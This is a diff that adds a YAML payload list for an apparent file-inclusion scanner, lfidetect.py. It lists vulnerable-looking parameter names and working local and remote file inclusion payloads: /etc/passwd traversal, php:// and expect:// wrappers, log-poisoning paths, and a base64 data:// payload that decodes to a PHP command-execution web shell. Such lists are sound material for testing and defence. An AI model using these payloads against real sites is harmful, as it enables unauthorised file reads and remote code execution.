@@ -1,0 +1,59 @@
+# LFI/RFI Detection Payloads
+# Usado por lfidetect.py
+
+lfi_params:
+  - file
+  - page
+  - include
+  - path
+  - doc
+  - folder
+  - root
+  - pg
+  - style
+  - pdf
+  - template
+  - php_path
+  - lang
+  - load
+  - fetch
+  - show
+  - display
+  - read
+  - source
+  - content
+  - cat
+  - dir
+  - action
+  - cmd
+  - exec
+  - command
+  - module
+  - lib
+  - tmp
+  - temp
+  - log
+
+lfi_payloads:
+  - ["php_filter", "php://filter/convert.base64-encode/resource=index"]
+  - ["php_filter", "php://filter/convert.base64-encode/resource=/etc/passwd"]
+  - ["php_input", "php://input"]
+  - ["php_data", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs="]
+  - ["expect", "expect://id"]
+  - ["null_byte", "../../../../etc/passwd%00"]
+  - ["null_byte", "..%2f..%2f..%2f..%2fetc%2fpasswd%00"]
+  - ["path_depth", "../../../../../../etc/passwd"]
+  - ["path_depth", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"]
+  - ["path_depth", "..\\..\\..\\..\\..\\..\\windows\\win.ini"]
+  - ["log_poison", "/var/log/apache2/access.log"]
+  - ["log_poison", "/var/log/nginx/access.log"]
+  - ["session", "/tmp/sess_<PHPSESSID>"]
+  - ["wrapper_chain", "php://filter/convert.base64-encode/resource=php://input"]
+
+rfi_payloads:
+  - ["rfi_remote", "http://httpbin.org/robots.txt"]
+  - ["rfi_remote", "https://httpbin.org/robots.txt"]
+  - ["rfi_double_encode", "http%3A%2F%2Fhttpbin.org%2Frobots.txt"]
+  - ["rfi_double_encode", "https%3A%2F%2Fhttpbin.org%2Frobots.txt"]
+  - ["rfi_ftp", "ftp://httpbin.org/robots.txt"]
+  - ["rfi_dict", "dict://httpbin.org/robots.txt"]
